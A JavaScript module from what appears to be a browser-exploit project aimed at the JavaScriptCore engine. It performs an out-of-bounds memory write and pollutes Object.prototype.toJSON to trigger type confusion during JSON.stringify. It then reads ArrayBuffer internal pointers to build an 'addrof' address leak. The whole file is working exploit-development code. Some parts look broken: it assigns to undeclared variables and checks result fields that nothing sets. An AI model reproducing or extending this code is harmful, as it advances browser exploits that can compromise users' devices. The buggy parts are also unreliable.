// js/script3/testArrayBufferVictimCrash.mjs (v56_SelfRefAndTypedArrayLeak)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V56_SRTAL = "OriginalHeisenbug_TypedArrayAddrof_v56_SelfRefAndTypedArrayLeak";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

let leak_target_buffer_v56 = null;
let leak_target_dataview_v56 = null;

let victim_typed_array_ref_v56 = null;
let probe_call_count_v56 = 0;
let all_probe_interaction_details_v56 = [];
let first_call_details_object_ref_v56 = null; // Referência ao C1_details

const PROBE_CALL_LIMIT_V56 = 10;

function toJSON_TA_Probe_SelfRefAndTypedArrayLeak_v56() {
    probe_call_count_v56++;
    const call_num = probe_call_count_v56;
    let current_call_details = {
        call_number: call_num,
        probe_variant: FNAME_MODULE_TYPEDARRAY_ADDROF_V56_SRTAL,
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v56),
        this_is_C1_details_obj: (this === first_call_details_object_ref_v56 && first_call_details_object_ref_v56 !== null),
        this_is_leak_target_AB: (this === leak_target_buffer_v56 && leak_target_buffer_v56 !== null),
        this_is_leak_target_DV: (this === leak_target_dataview_v56 && leak_target_dataview_v56 !== null),
        C1_payloads_assigned: false,
        addrof_read_val: null,
        error_in_probe: null
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. Type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsC1? ${current_call_details.this_is_C1_details_obj}. IsLeakAB? ${current_call_details.this_is_leak_target_AB}. IsLeakDV? ${current_call_details.this_is_leak_target_DV}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V56) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Probe call limit.`, "warn");
            all_probe_interaction_details_v56.push(current_call_details);
            return { recursion_stopped_v56: true, call: call_num };
        }

        // Caso 1: 'this' é a vítima original (primeira chamada)
        if (call_num === 1 && current_call_details.this_is_victim) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is victim. Creating C1_details & adding self_ref.`, "info");
            first_call_details_object_ref_v56 = current_call_details;
            current_call_details.self_ref = current_call_details; // Adiciona auto-referência
            all_probe_interaction_details_v56.push(current_call_details);
            return current_call_details;
        }
        // Caso 2: 'this' é o C1_details (type-confused)
        else if (current_call_details.this_is_C1_details_obj && current_call_details.this_type === '[object Object]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: TYPE CONFUSION ON C1_DETAILS_OBJECT ('this')! Assigning TypedArray payloads...`, "vuln");
            if (leak_target_buffer_v56) {
                this.payload_ArrayBuffer = leak_target_buffer_v56;
                current_call_details.C1_payloads_assigned = true;
            }
            if (leak_target_dataview_v56) {
                this.payload_DataView = leak_target_dataview_v56;
                current_call_details.C1_payloads_assigned = true;
            }
            // Tenta remover a auto-referência para permitir serialização dos payloads
            if (this.hasOwnProperty('self_ref')) {
                delete this.self_ref;
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Removed self_ref from C1_details.`, "info");
            }
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: C1_details modified. Keys: ${Object.keys(this).join(',')}`, "info");
            all_probe_interaction_details_v56.push(current_call_details);
            return this; // Retorna C1_details modificado
        }
        // Caso 3: 'this' é o ArrayBuffer ou DataView que injetamos
        else if ( (current_call_details.this_is_leak_target_AB && current_call_details.this_type === '[object ArrayBuffer]') ||
                  (current_call_details.this_is_leak_target_DV && current_call_details.this_type === '[object DataView]') ) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' IS THE INJECTED ${current_call_details.this_type}! Reading internal pointer...`, "critical");
            let leaked_val = null;
            try {
                let view_on_this_target = (current_call_details.this_type === '[object ArrayBuffer]') ? new DataView(this) : this;
                const offset_to_read = JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET; // 0x10
                if (view_on_this_target.byteLength < (offset_to_read + 8)) {
                    throw new RangeError(`Target ${current_call_details.this_type} too small (${view_on_this_target.byteLength}b) for 8b read at ${toHex(offset_to_read)}.`);
                }
                let low = view_on_this_target.getUint32(offset_to_read, true);
                let high = view_on_this_target.getUint32(offset_to_read + 4, true);
                let int64_val = new AdvancedInt64(low, high);
                let temp_buffer = new ArrayBuffer(8); (new Uint32Array(temp_buffer))[0] = low; (new Uint32Array(temp_buffer))[1] = high;
                leaked_val = (new Float64Array(temp_buffer))[0];

                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Read from ${current_call_details.this_type} at ${toHex(offset_to_read)}. Leaked: ${int64_val.toString(true)} (double: ${leaked_val})`, "vuln");
                current_call_details.addrof_read_val = leaked_val;
                all_probe_interaction_details_v56.push(current_call_details);
                return { leaked_address_v56: leaked_val, leaked_obj_type: current_call_details.this_type, from_offset: toHex(offset_to_read) };
            } catch (e_leak) {
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: ERROR extracting from ${current_call_details.this_type}: ${e_leak.name} - ${e_leak.message}`, "error");
                current_call_details.error_in_probe = e_leak.message;
                all_probe_interaction_details_v56.push(current_call_details);
                return { addrof_error_v56: e_leak.message, type: current_call_details.this_type };
            }
        }
        // Outros casos
        else {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is unexpected type: ${current_call_details.this_type}. IsC1? ${current_call_details.this_is_C1_details_obj}`, "warn");
            all_probe_interaction_details_v56.push(current_call_details);
            return { generic_marker_v56: call_num };
        }
    } catch (e) {
        current_call_details.error_in_probe = e.message;
        const FNAME_CURRENT_TEST_REF = FNAME_MODULE_TYPEDARRAY_ADDROF_V56_SRTAL;
        logS3(`[${current_call_details.probe_variant}] Call #${call_num}: CRITICAL ERROR in probe: ${e.name} - ${e.message}`, "critical", FNAME_CURRENT_TEST_REF);
        all_probe_interaction_details_v56.push(current_call_details);
        return { error_marker_v56: call_num };
    }
}

export async function executeTypedArrayVictimAddrofTest_SelfRefThenLeak() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V56_SRTAL}.triggerAndLog`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (SelfRefThenLeak) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V56_SRTAL} Init...`;

    probe_call_count_v56 = 0;
    all_probe_interaction_details_v56 = [];
    victim_typed_array_ref_v56 = null;
    first_call_details_object_ref_v56 = null;

    leak_target_buffer_v56 = new ArrayBuffer(0x80); // Tamanho robusto
    leak_target_dataview_v56 = new DataView(new ArrayBuffer(0x80));

    let errorCapturedMain = null;
    let rawStringifyOutput = null;
    let stringifyOutput_parsed = null;

    let addrof_A_result = { success: false, msg: "Addrof ArrayBuffer: Default (v56)" };
    let addrof_B_result = { success: false, msg: "Addrof DataView: Default (v56)" };
    const fillPattern = 0.56565656565656;

    let pollutionApplied = false;
    let originalToJSONDescriptor = null;
    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed. Value: ${toHex(OOB_WRITE_VALUE)}.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v56 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));
        // ... preenchimento ...

        const ppKey = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_SelfRefAndTypedArrayLeak_v56, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            logS3(`  Object.prototype.toJSON polluted. Calling JSON.stringify(victim_typed_array_ref_v56)...`, "info", FNAME_CURRENT_TEST);
            rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v56);
            logS3(`  JSON.stringify completed. Raw Stringify Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);

            try {
                stringifyOutput_parsed = JSON.parse(rawStringifyOutput);
            } catch (e_parse) {
                logS3(`  Error parsing stringifyOutput: ${e_parse.message}. Expected if circular. Output: ${rawStringifyOutput}`, "warn");
                stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput, parse_error: e_parse.message };
            }

            let heisenbugOnC1 = false;
            const call2Details = all_probe_interaction_details_v56.find(d => d.call_number === 2 && d.this_is_C1_details_obj);
            if (call2Details && call2Details.C1_payloads_assigned) {
                heisenbugOnC1 = true;
                logS3(`  EXECUTE: HEISENBUG on C1_details (Call #2) & PAYLOAD ASSIGNMENT CONFIRMED!`, "vuln", FNAME_CURRENT_TEST);
            } else {
                logS3(`  EXECUTE: ALERT: Heisenbug on C1_details (Call #2) or payload assignment NOT confirmed.`, "error", FNAME_CURRENT_TEST);
            }

            logS3("STEP 3: Checking for leaked addresses (v56)...", "warn", FNAME_CURRENT_TEST);

            if (stringifyOutput_parsed && typeof stringifyOutput_parsed === 'object' && stringifyOutput_parsed.leaked_address_v56 !== undefined) {
                const leaked_addr_val = stringifyOutput_parsed.leaked_address_v56;
                const obj_type = stringifyOutput_parsed.leaked_obj_type;
                const from_offset = stringifyOutput_parsed.from_offset;
                logS3(`  V56_ANALYSIS: Found 'leaked_address_v56' from probe case 3. Type: ${obj_type}, Offset: ${from_offset}`, "good");

                if (typeof leaked_addr_val === 'number' && !isNaN(leaked_addr_val) && leaked_addr_val !== 0) {
                    let p_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([leaked_addr_val]).buffer)[0], new Uint32Array(new Float64Array([leaked_addr_val]).buffer)[1]);
                    if (p_int64.high() > 0x70000000 || p_int64.low() > 0x10000000 || (p_int64.high() & 0xFF000000) === 0x80000000) {
                        if (obj_type === '[object ArrayBuffer]') {
                            addrof_A_result.success = true; addrof_A_result.msg = `V56 SUCCESS (Direct Read Target AB): ${p_int64.toString(true)} from ${from_offset}`;
                        } else if (obj_type === '[object DataView]') {
                            addrof_B_result.success = true; addrof_B_result.msg = `V56 SUCCESS (Direct Read Target DV): ${p_int64.toString(true)} from ${from_offset}`;
                        }
                    } else { /* Not a pointer pattern */ }
                } else { /* Not a useful number */ }
            }
            // Se a leitura direta falhou, checar se o C1_details (stringifyOutput_parsed) tem os payloads numéricos
            else if (stringifyOutput_parsed && typeof stringifyOutput_parsed === 'object' && stringifyOutput_parsed.call_number === 1) {
                const direct_leak_A = stringifyOutput_parsed.leaked_addr_A_direct;
                 if (typeof direct_leak_A === 'number' && !isNaN(direct_leak_A) && direct_leak_A !== 0) {
                    let pA_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([direct_leak_A]).buffer)[0], new Uint32Array(new Float64Array([direct_leak_A]).buffer)[1]);
                    if (pA_int64.high() > 0x70000000 || pA_int64.low() > 0x10000000 || (pA_int64.high() & 0xFF000000) === 0x80000000) {
                        addrof_A_result.success = true; addrof_A_result.msg = `V56 SUCCESS (C1 Direct Numeric A): ${pA_int64.toString(true)}`;
                    }
                }
                const direct_leak_B = stringifyOutput_parsed.leaked_addr_B_direct;
                if (typeof direct_leak_B === 'number' && !isNaN(direct_leak_B) && direct_leak_B !== 0) {
                    let pB_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([direct_leak_B]).buffer)[0], new Uint32Array(new Float64Array([direct_leak_B]).buffer)[1]);
                    if (pB_int64.high() > 0x70000000 || pB_int64.low() > 0x10000000 || (pB_int64.high() & 0xFF000000) === 0x80000000) {
                        addrof_B_result.success = true; addrof_B_result.msg = `V56 SUCCESS (C1 Direct Numeric B): ${pB_int64.toString(true)}`;
                    }
                }
                if (!addrof_A_result.success && stringifyOutput_parsed.payload_ArrayBuffer) addrof_A_result.msg = "C1.payload_ArrayBuffer present but not numeric leak.";
                if (!addrof_B_result.success && stringifyOutput_parsed.payload_DataView) addrof_B_result.msg = "C1.payload_DataView present but not numeric leak.";

            } else if (stringifyOutput_parsed && stringifyOutput_parsed.parse_error && rawStringifyOutput.includes("circular structure")) {
                 addrof_A_result.msg = "V56 Raw stringify had 'circular structure'.";
                 addrof_B_result.msg = "V56 Raw stringify had 'circular structure'.";
            } else {
                if (!addrof_A_result.success) addrof_A_result.msg = "V56 No suitable addrof data found in stringifyOutput.";
                if (!addrof_B_result.success) addrof_B_result.msg = "V56 No suitable addrof data found in stringifyOutput.";
            }

            if (addrof_A_result.success || addrof_B_result.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V56_SRTAL}: Addr SUCCESS!`;
            } else if (heisenbugOnC1 || (stringifyOutput_parsed && stringifyOutput_parsed.parse_error && rawStringifyOutput.includes("circular structure"))) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V56_SRTAL}: Heisenbug OK, Addr Fail`;
            } else {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V56_SRTAL}: No Heisenbug?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`  CRITICAL ERROR during JSON.stringify or processing: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V56_SRTAL}: Stringify/Log ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
                logS3(`  Object.prototype.toJSON restored.`, "info", FNAME_CURRENT_TEST);
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`  CRITICAL ERROR in main test execution: ${e_outer_main.name} - ${e_outer_main.message}${e_outer_main.stack ? '\n'+e_outer_main.stack : ''}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V56_SRTAL} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v56}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof A: Success=${addrof_A_result.success}, Msg='${addrof_A_result.msg}'`, addrof_A_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof B: Success=${addrof_B_result.success}, Msg='${addrof_B_result.msg}'`, addrof_B_result.success ? "good" : "warn", FNAME_CURRENT_TEST);

        victim_typed_array_ref_v56 = null;
        all_probe_interaction_details_v56 = [];
        probe_call_count_v56 = 0;
        first_call_details_object_ref_v56 = null;
        leak_target_buffer_v56 = null;
        leak_target_dataview_v56 = null;
        object_for_direct_conv_A_v56 = null;
        object_for_direct_conv_B_v56 = null;
    }
    return {
        errorCapturedMain: errorCapturedMain,
        potentiallyCrashed: errorCapturedMain?.name === 'RangeError',
        stringifyResult: stringifyOutput_parsed,
        rawStringifyForAnalysis: rawStringifyOutput,
        all_probe_calls_for_analysis: [...all_probe_interaction_details_v56],
        total_probe_calls: probe_call_count_v56,
        addrof_A_result: addrof_A_result,
        addrof_B_result: addrof_B_result
    };
};
